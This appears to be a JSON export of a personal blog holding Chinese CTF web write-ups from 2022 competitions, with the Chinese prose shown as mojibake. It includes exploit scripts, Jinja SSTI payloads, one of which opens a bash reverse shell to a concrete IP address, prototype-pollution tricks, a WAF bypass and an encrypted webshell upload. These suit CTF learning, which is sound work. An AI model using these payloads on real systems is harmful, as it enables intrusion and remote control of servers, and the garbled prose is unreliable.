{"pages":[{"title":"About","text":"éƒ½æƒ³å­¦,éƒ½ä¸ä¼š,ğŸ‘´è¦åšå…¨æ²¾ğŸ¥¹ å–œæ¬¢çš„éŸ³ä¹åŒºupä¸»ğŸ¥°ğŸ¥°ğŸ¥° è›€ç‰™ https://space.bilibili.com/3046429å’»å’»æ»¡ https://space.bilibili.com/37754047çš‚è€å¸ˆ https://space.bilibili.com/634131æµ…å½±é˜¿_ https://space.bilibili.com/651386960å…°éŸ³Reine https://space.bilibili.com/698029620 QQï¼šMTgyMjE0MzMxNA==","link":"/about/index.html"}],"posts":[{"title":"ğŸŒŸCTF2022-Webéƒ¨åˆ†WriteUp","text":"*CTF oh-my-lottoé¦–å…ˆç”¨æ¯”èµ›ç»™çš„é™„ä»¶ï¼Œç”¨Dokceræ­å¥½ç¯å¢ƒ docker-compose builddocker-compose up æ­£å¸¸å¯åŠ¨ ç»™äº†æºç ï¼Œæ‰€ä»¥è¿›è¡Œç™½ç›’å®¡è®¡ï¼Œå››ä¸ªç•Œé¢åˆ†åˆ«å¯¹åº”å››ä¸ªè·¯ç”± å…¶ä¸­lottoçš„è·¯ç”±ä¸»è¦éƒ¨åˆ†æ˜¯è¿™äº› @app.route(&quot;/lotto&quot;, methods=['GET', 'POST'])def lotto(): message = '' if request.method == 'GET': return render_template('lotto.html') elif request.method == 'POST': flag = os.getenv('flag') lotto_key = request.form.get('lotto_key') or '' lotto_value = request.form.get('lotto_value') or '' try: lotto_key = lotto_key.upper() except Exception as e: print(e) message = 'Lotto Error!' return render_template('lotto.html', message=message) if safe_check(lotto_key): os.environ[lotto_key] = lotto_value try: os.system('wget --content-disposition -N lotto') if os.path.exists(&quot;/app/lotto_result.txt&quot;): lotto_result = open(&quot;/app/lotto_result.txt&quot;, 'rb').read() else: lotto_result = 'result' if os.path.exists(&quot;/app/guess/forecast.txt&quot;): forecast = open(&quot;/app/guess/forecast.txt&quot;, 'rb').read() else: forecast = 'forecast' if forecast == lotto_result: return flag å¤§æ¦‚å«ä¹‰å°±æ˜¯ä¼šä»å†…ç½‘çš„lottoç•Œé¢å–å‡ºä¸€ä¸ªæ–‡ä»¶ï¼ˆå¯ä»¥åœ¨lottoçš„app.pyä¸­å‘ç°äº‹ä¸€ä¸²éšæœºæ•°ï¼‰ï¼Œç„¶åä¸forecastä¼ å…¥çš„æ–‡ä»¶è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœç›¸åŒå°±ä¼šè¿”å›ä»ç¯å¢ƒå˜é‡ä¸­å–å‡ºçš„flag ç„¶åå°±æ˜¯ def safe_check(s): if 'LD' in s or 'HTTP' in s or 'BASH' in s or 'ENV' in s or 'PROXY' in s or 'PS' in s: return False return True å› ä¸ºè¿™ä¸ªå‡½æ•°è¿‡æ»¤äº†ä¸€äº›ç¯å¢ƒå˜é‡ï¼Œæ‰€ä»¥ä¹‹å‰HFä¸­çœ‹pç¥æåˆ°çš„ç¯å¢ƒå˜é‡è¿›è¡ŒRCEä¹Ÿä¸è¡Œäº† çœ‹äº†WPæ‰çŸ¥é“ï¼Œæ§åˆ¶PATHï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è¿›è¡Œä¸€äº›éªšæ“ä½œ PATHå˜é‡å°±æ˜¯ç”¨äºä¿å­˜å¯ä»¥æœç´¢çš„ç›®å½•è·¯å¾„ï¼Œå¦‚æœå¾…è¿è¡Œçš„ç¨‹åºä¸åœ¨å½“å‰ç›®å½•ï¼Œæ“ä½œç³»ç»Ÿä¾¿å¯ä»¥å»ä¾æ¬¡æœç´¢PATHå˜é‡å˜é‡ä¸­è®°å½•çš„ç›®å½•ï¼Œå¦‚æœåœ¨è¿™äº›ç›®å½•ä¸­æ‰¾åˆ°å¾…è¿è¡Œçš„ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿä¾¿å¯ä»¥ç›´æ¥è¿è¡Œï¼Œå‰ææ˜¯æœ‰æ‰§è¡Œæƒé™ é‚£æ—¢ç„¶å®ƒæ˜¯ä¼šç”¨wgetå–è¯»å–éšæœºæ•°ï¼Œé‚£æˆ‘ä»¬æ§åˆ¶PATHï¼Œè®©å®ƒæ‰¾ä¸åˆ°wgetï¼Œå®ƒå°±æ— æ³•å†è¯»å‡ºéšæœºæ•°ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å·²çŸ¥çš„ç¬¬ä¸€æ¬¡ç”Ÿæˆçš„éšæœºæ•°ä¸Šä¼ ï¼Œä¸å°±å¯¹æ¯”æ˜¯ä¸€æ ·çš„äº†å˜› EXPå¦‚ä¸‹ import requestsfrom lxml import etreeurl = &quot;http://localhost:8880/&quot;lotto_data = { &quot;lotto_key&quot;: &quot;&quot;, &quot;lotto_value&quot;: &quot;&quot;}lotto_data1 = { &quot;lotto_key&quot;: &quot;PATH&quot;, &quot;lotto_value&quot;: &quot;/&quot;}requests.post(url=(url + &quot;lotto&quot;), data=lotto_data)resp = requests.get(url=(url + &quot;result&quot;))html = etree.HTML(resp.text)result = html.xpath(&quot;/html/body/div[2]/div/p[3]/text()&quot;)print(result)with open(&quot;result.txt&quot;, &quot;w+&quot;) as f: f.writelines(result)requests.post(url=(url + &quot;forecast&quot;), files={'file': open(&quot;result.txt&quot;, &quot;rb&quot;)})r = requests.post(url=(url + &quot;lotto&quot;), data=lotto_data1)print(r.text) æˆåŠŸå¾—åˆ°flag oh-my-lotto-revengeç®—æ˜¯ä¸Šä¸€é¢˜çš„ä¸€ä¸ªè¿›é˜¶ç‰ˆæœ¬ è¿™é‡Œå°±ç®—é¢„æµ‹æ­£ç¡®ï¼Œä¹Ÿä¸ä¼šè¿”å›flag æ ¹æ®wpçš„è¿™ä¸ªé“¾æ¥ æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªWGETRCï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç¯å¢ƒå˜é‡å°±å¯ä»¥æ§åˆ¶wgetçš„å‚æ•°ï¼Œå…¶ä¸­è¿™é‡Œä¸»è¦åˆ©ç”¨è¿™ä¸¤ä¸ª http_proxy = stringUse string as HTTP proxy, instead of the one specified in environment.wgetçš„æµé‡å°±ä¼šå…ˆè½¬å‘åˆ°è¿™ä¸ªæŒ‡å®šçš„ä»£ç†ä¸Šï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æˆä¸ºä¸€ä¸ªä¸­é—´äººoutput_document = fileSet the output filenameâ€”the same as â€˜-O fileâ€™.è¿™ä¸ªæˆ‘ä»¬å°±èƒ½æ§åˆ¶ç›®å½•æ–‡ä»¶ï¼Œè¦†ç›–templates/index.htmlï¼Œæ‰“ä¸€ä¸ªSSTI å…ˆåšä¸ªå®éªŒï¼Œçœ‹wgetçš„æµé‡èƒ½å¦è½¬å‘åˆ°æˆ‘ä»¬çš„ç›‘å¬ç«¯å£ä¸Š å†ç”¨å¦‚ä¸‹exp &quot;&quot;&quot;@Author: C4ry7nk&quot;&quot;&quot;import requestsurl = &quot;http://localhost:8880/&quot;r = requests.post(url + &quot;forecast&quot;, files={'file': open(&quot;lnk.txt&quot;, &quot;rb&quot;)})data = { &quot;lotto_key&quot;: &quot;WGETRC&quot;, &quot;lotto_value&quot;: &quot;/app/guess/forecast.txt&quot;}resp = requests.post(url + &quot;lotto&quot;, data=data)print(resp.text) ç„¶åæˆ‘ä»¬åœ¨æœ¬åœ°dockerçš„shellé‡Œå°±å¯ä»¥å‘ç°ï¼Œçš„ç¡®å†™å…¥äº†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ é‚£æˆ‘ä»¬å¦‚æœå†™å…¥åå¼¹shellçš„SSTIï¼Œå†åˆ·æ–°index.htmlï¼Œå°±å¯ä»¥getshelläº† äºæ˜¯æˆ‘ä»¬å†™å…¥ {{config.__class__.__init__.__globals__['os'].popen('bash -c &quot;bash -i &gt;&amp; /dev/tcp/118.251.146.118/1234 0&gt;&amp;1&quot;').read()}} åˆ·æ–°index.htmlåï¼ŒæˆåŠŸè·å¾—shell åœ¨envä¸­çœ‹åˆ°flag å‚è€ƒY4å¸ˆå‚…çš„WP","link":"/2022/04/19/*CTF2022/"},{"title":"2022DASCTF MAY å‡ºé¢˜äººæŒ‘æˆ˜èµ›","text":"Web WriteUp Power CookieæŠ“åŒ…çœ‹åˆ°æœ‰ä¸ªSet-Cookie: admin=0;ä¿®æ”¹ä¸º1è®¿é—®å³å¯ é­”æ³•æµè§ˆå™¨æŠ“åŒ…çœ‹åˆ°ä¸€ä¸²jsï¼Œç›´æ¥æ§åˆ¶å°è·‘ä¸€ä¸‹ æ”¹æ‰UAå¤´å¾—åˆ°flag getmeçœ‹ä¸€ä¸‹æœåŠ¡ç‰ˆæœ¬ Apache 2.4.5ï¼Œæœç„¶æ²¡çŒœé”™è€ƒçš„æ˜¯é‚£ä¸ªç›®å½•ç©¿è¶Šçš„æ¼æ´ï¼Œéšä¾¿ç½‘ä¸Šæ‰¾æ‰¾payload https://blog.csdn.net/weixin_45694388/article/details/120801856 ä½†æ˜¯æ‰¾flagçš„è¿™ä¸ªç›®å½•æ˜¯çœŸçš„é•¿ hackmeè¿™é¢˜æ˜¯ä¸ªgoè¯­è¨€çš„é¢˜ç›®ï¼Œæˆ‘æ²¡å­¦è¿‡ï¼Œä¸å’‹ä¼šğŸ’¦ èµ›åå¤ç°ä¸‹çŸ¥é“åªæ˜¯è€ƒgoçš„åˆ©ç”¨å’Œç™½åå• é¦–å…ˆå‘ç°åœ¨/uploadè¿™ä¸ªä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ ä¸€äº›goæ–‡ä»¶éƒ½æ— æ³•è¢«è§£æï¼Œè€Œlistä¸Šçš„ä¸€äº›æ–‡ä»¶å¯ä»¥è¢«è§£æï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸Šé¢çš„æ–‡ä»¶åï¼Œå†™å…¥æˆ‘ä»¬è¦æ‰§è¡Œçš„ä»£ç  package mainimport ( &quot;fmt&quot; &quot;os/exec&quot;)func exp() { out, err := exec.Command(&quot;cat&quot;,&quot;/flag&quot;).Output() if err != nil { fmt.Printf(&quot;%s&quot;, err) } output := string(out[:]) fmt.Println(output)}func main() { exp()} ç„¶åè®¿é—®å¯¹åº”çš„æ–‡ä»¶å³å¯","link":"/2022/05/22/2022DASCTF%20May/"},{"title":"DASCTF X CBCTF 2022ä¹æœˆæŒ‘æˆ˜èµ›","text":"æœ‰æ‰€æ”¶è· dino3då‰ç«¯jså°æ¸¸æˆï¼Œåƒæ˜¯googleå°æé¾™çš„3Dç‰ˆ æŠ“åŒ…å¯ä»¥å‘ç°åç«¯ä¼šæœ‰ä¸ªcheck.phpæ£€æµ‹ åç«¯çœ‹ä¸åˆ°é€»è¾‘ï¼Œå°±å…ˆå®¡å®¡å‰ç«¯jsçš„ä»£ç ï¼Œf12æŠ“åŒ…å¯ä»¥å‘ç°æ˜¯ç”±bulid.min.jså‘èµ·çš„ æˆ‘ä»¬è·Ÿä¸€ä¸‹ï¼Œå†æœç´¢æ‰¾åˆ°äº†snå‡½æ•°ï¼Œè¯·æ±‚ä½“çš„é€»è¾‘ä¹Ÿåœ¨è¿™ ä¸‹ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°checkCodeçš„å€¼ å¹¶ä¸”ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çŸ¥é“è°ƒç”¨snçš„å‡½æ•° ç›´æ¥æ§åˆ¶å°ä¼ å€¼ Text Reverseræµ…æœä¸€ä¸‹ï¼Œå‘ç°æ˜¯å¤–å›½çš„ä¸€é“åŸé¢˜æ”¹ç¼–çš„ https://pankas.top/2022/07/25/dicectf-hope-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/ è¿™é“é¢˜å¤šäº†è¿‡æ»¤æ‰‹æ®µï¼Œä½†ä¸å¤šï¼Œç®€å•fuzzä¸€ä¸‹ï¼Œå‘ç°åŒ{ {ä¸å¯ä»¥ï¼Œç½‘ä¸Šæœä¸€ä¸‹å¯ä»¥ç”¨{ % + printç»•è¿‡ payload = '''{%print(''.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;nl /flag&quot;).read()'))%}'''[::-1]print(payload) è¯»æ–‡ä»¶è¿‡æ»¤äº†catæˆ‘ç›´æ¥ç”¨nlè¯»äº† cbshopä¹Ÿæ˜¯å›½å¤–çš„ä¸€é“é¢˜æ”¹ç¼–è¿‡æ¥çš„ï¼Œnodejsçš„é¢˜ï¼Œä¸å¾—ä¸è¯´ï¼Œè€å¤–çœŸå–œæ¬¢jså•Š https://nanimokangaeteinai.hateblo.jp/entry/2022/08/09/022238#Web-209-simplewaf-28-solves https://viblo.asia/p/corctf-2022-writeup-part-1-m68Z0Joj5kG è¿™é‡Œæ„Ÿå¹ä¸€ä¸‹ï¼ŒgoogleçœŸå¥½ç”¨ ç»™äº†æºç  const fs = require('fs');const express = require('express');const session = require('express-session');const bodyParse = require('body-parser');const app = express();const PORT = process.env.PORT || 80;const SECRET = process.env.SECRET || &quot;cybershop_challenge_secret&quot;const adminUser = { username: &quot;admin&quot;, password: &quot;ğŸ˜€adminğŸ˜€&quot;, money: 9999};app.use(bodyParse.urlencoded({extended: false}));app.use(express.json());app.use(session({ secret: SECRET, saveUninitialized: false, resave: false, cookie: { maxAge: 3600 * 1000 }}));app.use(express.static(&quot;static&quot;));app.get('/isLogin', function(req, res) { if(req.session.username) { return res.json({ code: 2, username: req.session.username, money: req.session.money }); }else{ return res.json({code: 0, msg: 'Please login!'}); }});app.post('/login', function(req, res) { let username = req.body.username; let password = req.body.password; if (typeof username !== 'string' || username === '' || typeof password !== 'string' || password === '') { return res.json({code: 4, msg: 'illegal username or password!'}) } if(username === adminUser.username &amp;&amp; password === adminUser.password.substring(1,6)) {//only admin need password req.session.username = username; req.session.money = adminUser.money; return res.json({ code: 1, username: username, money: req.session.money, msg: 'admin login success!' }); } req.session.username = username; req.session.money = 10; return res.json({ code: 1, username: username, money: req.session.money, msg: `${username} login success!` });});app.post('/changeUsername', function(req, res) { if(!req.session.username) { return res.json({ code: 0, msg: 'please login!' }); } let username = req.body.username; if (typeof username !== 'string' || username === '') { return res.json({code: 4, msg: 'illegal username!'}) } req.session.username = username; return res.json({ code: 2, username: username, money: req.session.money, msg: 'Username change success' });});//è´­ä¹°å•†å“çš„æ¥å£function buyApi(user, product) { let order = {}; if(!order[user.username]) { order[user.username] = {}; } Object.assign(order[user.username], product); if(product.id === 1) { //buy fakeFlag if(user.money &gt;= 10) { user.money -= 10; Object.assign(order, { msg: fs.readFileSync('/fakeFlag').toString() }); }else{ Object.assign(order,{ msg: &quot;you don't have enough money!&quot; }); } }else if(product.id === 2) { //buy flag if(user.money &gt;= 11 &amp;&amp; user.token) { //do u have token? if(JSON.stringify(product).includes(&quot;flag&quot;)) { Object.assign(order,{ msg: &quot;hint: go to 'readFileSync'!!!!&quot; }); }else{ user.money -= 11; Object.assign(order,{ msg: fs.readFileSync(product.name).toString() }); } }else { Object.assign(order,{ msg: &quot;nononono!&quot; }); } }else { Object.assign(order,{ code: 0, msg: &quot;no such product!&quot; }); } Object.assign(order, { username: user.username, code: 3, money: user.money }); return order;}app.post('/buy', function(req, res) { if(!req.session.username) { return res.json({ code: 0, msg: 'please login!' }); } var user = { username: req.session.username, money: req.session.money }; var order = buyApi(user, req.body); req.session.money = user.money; res.json(order);});app.get('/logout', function(req, res) { req.session.destroy(); return res.json({ code: 0, msg: 'logout success!' });});app.listen(PORT, () =&gt; {console.log(`APP RUN IN ${PORT}`)}); ç»™äº†ç”¨æˆ·åå’Œå¯†ç ï¼Œä½†æ˜¯åœ¨åé¢åˆä¼šå‘ç°æŠŠå¯†ç æˆªæ–­äº†ï¼Œå¹¶ä¸”æ˜¯ä¸ªemojiï¼Œæˆ‘ä»¬å¾—ç¼–ç å†ä¼ ï¼Œè¿™é‡Œç›´æ¥åœ¨æ§åˆ¶å°æ“ä½œ æœ‰9999è¿™ä¹ˆå¤šé’±ï¼Œæˆ‘ä»¬å‘ç°ä¾ç„¶ä¹°ä¸äº†flagï¼Œç»§ç»­å¾€ä¸‹çœ‹ ...... }else if(product.id === 2) { //buy flag if(user.money &gt;= 11 &amp;&amp; user.token) { //do u have token? if(JSON.stringify(product).includes(&quot;flag&quot;)) { Object.assign(order,{ msg: &quot;hint: go to 'readFileSync'!!!!&quot; }); }else{ user.money -= 11; Object.assign(order,{ msg: fs.readFileSync(product.name).toString() }); } }else { Object.assign(order,{ msg: &quot;nononono!&quot; }); } }else { Object.assign(order,{ code: 0, msg: &quot;no such product!&quot; }); } Object.assign(order, { username: user.username, code: 3, money: user.money }); return order;} å¯ä»¥çœ‹åˆ°è¿™ä¸ªifé‡Œå¤šäº†ä¸ªtokenåˆ¤æ–­ï¼Œä½†æ˜¯æˆ‘ä»¬å‘å‰æ‰¾å‘ç°userå¹¶æ²¡æœ‰è¿™ä¸ªå±æ€§ï¼Œå½“ç„¶ä»–ä¸å¯èƒ½å‡­ç©ºå­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°ï¼Œjsä¼šå‘ä¸Šå»æ‰¾ä»–åŸå‹é“¾å¯»æ‰¾è¿™ä¸ªå‚æ•°ï¼Œæ³¨æ„çœ‹è¿™é‡Œ Object.assign(order[user.username], product); è¿™ä¸ªusernameå¯ä»¥æ”¹ï¼Œæˆ‘ä»¬å¯æ§ï¼Œè€Œè¿™ä¸ªassingåˆæ˜¯ä¸€ä¸ªåˆå¹¶çš„æ“ä½œï¼Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œæˆ‘ä»¬ä½¿username=__proto__ï¼Œå°†productåˆå¹¶åˆ°orderåŸå‹ä¸Šï¼Œorderå’ŒuseråŸå‹åˆéƒ½æ˜¯Objectã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºtokenå‚æ•° ç„¶åæˆ‘ä»¬å‘ç°ï¼Œè¿™é‡Œè¿‡æ»¤æ‰äº†flagå…³é”®å­—ï¼Œå¹¶æç¤ºå»çœ‹readFileSyncè¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯ä¸å½±å“æˆ‘ä»¬è¯»å…¶ä»–æ–‡ä»¶ï¼Œå¦‚ä¸‹ è¿™é‡Œæˆ‘ä»¬è·Ÿç€åˆ†æä¸€ä¸‹readFileSync https://github.com/nodejs/node/blob/main/lib/fs.js#L452 function readFileSync(path, options) { options = getOptions(options, { flag: 'r' }); const isUserFd = isFd(path); // File descriptor ownership const fd = isUserFd ? path : fs.openSync(path, options.flag, 0o666);... ä¸‹é¢æ˜¯è¯»æ–‡ä»¶çš„æ“ä½œï¼Œæˆ‘ä»¬ä¸»è¦è·Ÿè¿›openSync function openSync(path, flags, mode) { path = getValidatedPath(path); const flagsNumber = stringToFlags(flags); mode = parseFileMode(mode, 'mode', 0o666); const ctx = { path }; const result = binding.open(pathModule.toNamespacedPath(path), flagsNumber, mode, undefined, ctx); handleErrorFromBinding(ctx); return result;} è¿™é‡Œæœ‰ä¸ªgetValidatedPathä¼¼ä¹æ˜¯è·å–æ–‡ä»¶è·¯å¾„ï¼Œç»§ç»­è·Ÿ function getValidatedPath (fileURLOrPath) { const path = fileURLOrPath != null &amp;&amp; fileURLOrPath.href &amp;&amp; fileURLOrPath.origin ? fileURLToPath(fileURLOrPath) : fileURLOrPath return path} éœ€è¦fileURLOrPath &amp; href &amp; originéƒ½ä¸ä¸ºç©ºï¼Œæ¥ç€çœ‹fileURLOrPath function fileURLToPath(path) { if (typeof path === 'string') path = new URL(path); else if (!isURLInstance(path)) throw new ERR_INVALID_ARG_TYPE('path', ['string', 'URL'], path); if (path.protocol !== 'file:') throw new ERR_INVALID_URL_SCHEME('file'); return isWindows ? getPathFromURLWin32(path) : getPathFromURLPosix(path);} function isURLInstance(fileURLOrPath) { return fileURLOrPath != null &amp;&amp; fileURLOrPath.href &amp;&amp; fileURLOrPath.origin;} è¿™é‡Œéœ€è¦path.protocol == 'file:'ï¼Œæ‰èƒ½èµ°åˆ°returnï¼Œè¿™é‡Œåœ¨isURLInstanceä¹Ÿèƒ½å‘ç°é‚£ä¸‰ä¸ªå€¼ä¸èƒ½ä¸ºnullï¼Œå› ä¸ºæ˜¯linuxçš„ç¯å¢ƒï¼Œè·Ÿåé¢ä¸€ä¸ª function getPathFromURLPosix(url) { if (url.hostname !== '') { throw new ERR_INVALID_FILE_URL_HOST(platform); } const pathname = url.pathname; for (let n = 0; n &lt; pathname.length; n++) { if (pathname[n] === '%') { const third = pathname.codePointAt(n + 2) | 0x20; if (pathname[n + 1] === '2' &amp;&amp; third === 102) { throw new ERR_INVALID_FILE_URL_PATH( 'must not include encoded / characters' ); } } } return decodeURIComponent(pathname);} é¦–å…ˆè¦url.hostname == ''ç»•è¿‡ifï¼Œè¿™é‡Œå¯ä»¥å‘ç°å®ƒå¯¹ä¼ å…¥çš„pathnameè¿›è¡Œäº†URLè§£ç çš„æ“ä½œï¼Œåˆšå¥½çœ‹æ–‡æ¡£æˆ‘ä»¬çŸ¥é“fs.readFileSyncæ˜¯æ¥å—URLå‚æ•°çš„ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†flagè¿›è¡Œç¼–ç ç»•è¿‡ifæ£€æŸ¥ï¼Œå¹¶ä¸”ä¸å½±å“è¯»æ–‡ä»¶æ“ä½œ å¹¶ä¸”è¦æ»¡è¶³ä¹‹å‰è¯´åˆ°çš„å‡ ä¸ªå‚æ•°æ¡ä»¶ pathname urlencode file.origin exists file.href exists file.protocol = 'file:' file.hostname = ''","link":"/2022/09/22/2022DASCTF%20SEP/"},{"title":"2022è¥¿æ¹–è®ºå‰‘-Webå¤ç°","text":"å‰è¨€å¥½ä¹…æ²¡åšé¢˜äº†â€¦ æ‰­è½¬ä¹¾å¤éšä¾¿ä¸Šä¼ ä¼šè¢«403æ‹’ç» https://www.anquanke.com/post/id/241265#h2-0 å‚è€ƒè¿™ä¸ª å¯¹multipart/forM-dataè¿›è¡Œç©ºæ ¼æ‹†åˆ†æˆ–è€…å¤§å°å†™å˜æ¢å¯ä»¥ç»•è¿‡ nodeå®¡ä¸€ä¸‹æºç å‘ç°controller.jsçš„è¿™ä¸€æ®µ function Flag1Controller(req,res){ try { if(req.cookies.user === SECRET_COOKIE){ res.setHeader(&quot;This_Is_The_Flag1&quot;,flag1.toString().trim()) res.setHeader(&quot;This_Is_The_Flag2&quot;,flag2.toString().trim()) res.status(200).type(&quot;text/html&quot;).send(&quot;Login success. Welcome,admin!&quot;) } if(req.cookies.user === &quot;admin&quot;) { res.setHeader(&quot;This_Is_The_Flag1&quot;, flag1.toString().trim()) res.status(200).type(&quot;text/html&quot;).send(&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;) }else{ res.status(401).type(&quot;text/html&quot;).send(&quot;Unauthorized&quot;) } }catch (__) {}} æ³¨æ„ç¬¬äºŒä¸ªifï¼Œè®¾ç½®Cookieå°±èƒ½å¾—åˆ°flag1 æ¥ç€çœ‹ç¬¬äºŒéƒ¨åˆ† function CheckController(req,res) { let checkcode = req.body.checkcode?req.body.checkcode:1234; console.log(req.body) if(checkcode.length === 16){ try{ checkcode = checkcode.toLowerCase() if(checkcode !== &quot;aGr5AtSp55dRacer&quot;){ res.status(403).json({&quot;msg&quot;:&quot;Invalid Checkcode1:&quot; + checkcode}) } }catch (__) {} res.status(200).type(&quot;text/html&quot;).json({&quot;msg&quot;:&quot;You Got Another Part Of Flag: &quot; + flag2.toString().trim()}) }else{ res.status(403).type(&quot;text/html&quot;).json({&quot;msg&quot;:&quot;Invalid Checkcode2:&quot; + checkcode}) }} ä¸»è¦çœ‹åˆ°é‚£ä¸ªtoLowerCase()å‡½æ•°ï¼Œæˆ‘ä»¬æ­£å¸¸è¾“å…¥çš„è¯ï¼Œè‚¯å®šä¼šè¢«è½¬æˆå°å†™ï¼Œä½†æ˜¯æ³¨æ„åˆ°è¿™é‡Œï¼Œå¦‚æœæˆ‘ä»¬èƒ½èµ°åˆ°catchï¼Œä¹Ÿå°±èƒ½è·å¾—flagï¼Œæ‰€ä»¥å¾—æƒ³åŠæ³•è®©å®ƒæŠ¥é”™ è€Œæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªåˆ—è¡¨æ—¶ï¼Œè¿™ä¸ªtoLowerCase()å°±ä¼šæŠ¥é”™ã€‚åŒæ—¶æ³¨æ„é•¿åº¦è¦ä¸º16æ‰èƒ½è¿›å…¥if unsual phpé¢˜ç›®ä»£ç å°±ä¸‰ä¸ªåŠŸèƒ½ï¼Œè¯»å†™æ–‡ä»¶ï¼ŒæŸ¥çœ‹phpinfo é¢˜ç›®è€ƒç‚¹ä¸»è¦æ˜¯æ”¹äº†æºç çš„engineï¼Œå¯¹phpæºç è¿›è¡Œäº†åŠ å¯†å†è§£æï¼Œæ‰€ä»¥è¯»æœ‰äº›æ–‡ä»¶æ˜¯ä¹±ç çš„ï¼Œæ¯”å¦‚index.phpï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœç›´æ¥ä¸Šä¼ æ–‡ä»¶çš„è¯ï¼Œæ˜¯è¡Œä¸é€šçš„ï¼Œæ— æ³•è§£æ æ–¹æ³•çš„è¯å¯ä»¥é€šè¿‡php.iniå’Œphpinfoæ‰¾åˆ° zend_test.soçš„ä½ç½®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¯»/proc/self/mapsæ‰¾åˆ° æ¥ç€ç”¨phpä¼ªåè®®æŠŠè¿™ä¸ªè¯»å‡ºæ¥ /?a=read&amp;file=php://filter/read=convert.base64-encode/resource=/usr/local/lib/php/extensions/no-debug-non-zts-20190902/zend_test.so ç”¨cyberchefå¯ä»¥ç›´æ¥å¯¼å‡ºä¸ºæ–‡ä»¶ï¼Œå°±ä¸æ€•ä¸¢å¤±äº†æ•°æ®äº†ï¼Œå†ç”¨idaè¿›è¡Œåˆ†æ å¯ä»¥å‘ç°æ˜¯ç”¨RC4åŠ å¯†çš„ï¼Œkeyæ˜¯abcsdfadfjiweur ç„¶åæˆ‘ä»¬å°±èƒ½ç”¨è¿™ä¸ªkeyï¼ŒåŠ å¯†æˆ‘ä»¬çš„ğŸï¼Œç„¶åä¸Šä¼  import requestsimport base64# &lt;?php# if($_GET[&quot;a&quot;]==&quot;upload&quot;){# move_uploaded_file($_FILES['file'][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES['file'][&quot;name&quot;]);# }elseif ($_GET[&quot;a&quot;]==&quot;read&quot;) {# echo file_get_contents($_GET[&quot;file&quot;]);# }elseif ($_GET[&quot;a&quot;]==&quot;version&quot;) {# phpinfo();# }url = &quot;http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81/?a=upload&quot;payload = &quot;473xeG4d3kJANayE56+fzrJLaDo2vtMx&quot;file = { 'file': ('kk1.php', base64.b64decode(payload), '&lt;text/plain&gt;')}resp = requests.post(url=url, files=file)print(resp.text) ä¹‹åå°±æ˜¯åå¼¹shellï¼Œflagæ˜¯rootç”¨æˆ·ï¼Œç„¶åchmodæœ‰sudoæƒé™ï¼Œææƒè¯»flagï¼Œè¿™é‡Œå› ä¸ºå¤ç°é¶æœºæ˜¯å…¬ç”¨çš„ï¼Œæ‰€ä»¥ç›´æ¥è¯»äº† real_ez_nodeç®€å•è®°å½•ä¸‹ï¼Œæ²¡å’‹çœ‹nodejsç›¸å…³çš„ğŸ˜­ é¦–å…ˆçœ‹åˆ°/copyè¿™ä¸ªè·¯ç”± router.post('/copy',(req,res)=&gt;{ res.setHeader('Content-type','text/html;charset=utf-8') var ip = req.connection.remoteAddress; console.log(ip); var obj = { msg: '', } if (!ip.includes('127.0.0.1')) { obj.msg=&quot;only for admin&quot; res.send(JSON.stringify(obj)); return } let user = {}; for (let index in req.body) { if(!index.includes(&quot;__proto__&quot;)){ safeobj.expand(user, index, req.body[index]) } } res.render('index');}) æ³¨æ„åˆ°è¿™ä¸ªsafeobjï¼Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“ æµ‹è¯• const safeobj = require('safe-obj');//var payload = `{&quot;__proto__&quot;:{&quot;whoami&quot;:&quot;root&quot;}}`var payload = `{&quot;constructor.prototype.whoami&quot; :&quot;root&quot;}`let user = {};console.log(&quot;Before whoami:&quot; + user.whoami);for (let index in JSON.parse(payload)) { safeobj.expand(user, index, JSON.parse(payload)[index])}console.log(&quot;After whoami: &quot; + user.whoami);// Before :undefined// After: root å› ä¸ºè¿™é‡Œè¿‡æ»¤äº†__proto__ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨{&quot;constructor.prototype.whoami&quot; :&quot;root&quot;}ï¼Œè¿˜æœ‰å‰é¢è¦ä¿è¯ipä¸º127.0.0.1ï¼Œåº”è¯¥æ˜¯è¦æ‰“ä¸€ä¸ªssrfï¼Œæˆ‘ä»¬çœ‹åé¢æœ‰ä¸ªcurlè·¯ç”± router.get('/curl', function(req, res) { var q = req.query.q; var resp = &quot;&quot;; if (q) { var url = 'http://localhost:3000/?q=' + q try { http.get(url,(res1)=&gt;{ const { statusCode } = res1; const contentType = res1.headers['content-type']; let error; // ä»»ä½• 2xx çŠ¶æ€ç éƒ½è¡¨ç¤ºæˆåŠŸå“åº”ï¼Œä½†è¿™é‡Œåªæ£€æŸ¥ 200ã€‚ if (statusCode !== 200) { error = new Error('Request Failed.\\n' + `Status Code: ${statusCode}`); } ...//çœç•¥ä¸€äº›ä»£ç  } else { res.send(&quot;search param 'q' missing!&quot;); }}) 